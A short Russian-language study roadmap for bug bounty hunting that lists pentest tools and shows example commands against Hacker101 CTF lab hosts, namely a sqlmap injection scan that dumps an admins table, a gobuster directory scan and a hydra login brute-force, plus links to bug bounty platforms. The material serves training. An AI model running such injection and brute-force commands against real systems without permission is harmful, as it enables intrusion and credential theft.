# Roadmap

1. Получение новых знаний и навыков
2. Нахождение багов
3. Составление корректного отчета о найденном баге

## Инструменты:

+ nmap - сканирование открытых портов
+ sqlmap - сканирование на sql инъекции
+ gobuster - сканирование на поддомены, директории
+ hydra - brute force логина/пароля

## Примеры использования инструментов

+ sqlmap -u "https://87712c999b75e62ae32cdf2d219d057c.ctf.hacker101.com/login" --method="POST" --data="username=123&password=123" -v 2 --dbms "MySQL" --threads 5 --dump -T admins
+ gobuster dir -u "https://50268e340771b49bd51c70d2bd81195d.ctf.hacker101.com" -w ~/Documents/projects/pentest/SecLists/Discovery/Web-Content/
Logins.fuzz.txt
+ hydra -V -t 32 -L ~/Documents/projects/pentest/SecLists/Usernames/Names/names.txt -p password https-post-form://50268e340771b49bd51c70d2bd81195d.ctf.hacker101.com/login:"username=^USER^&password=^PASS^":"Invalid username"

## Регистрация на сайтах

+ https://hacker101.com/ (ctf)
+ https://bugbounty.ru/
+ https://bugbounty.standoff365.com/
+ https://bugbounty.bi.zone/
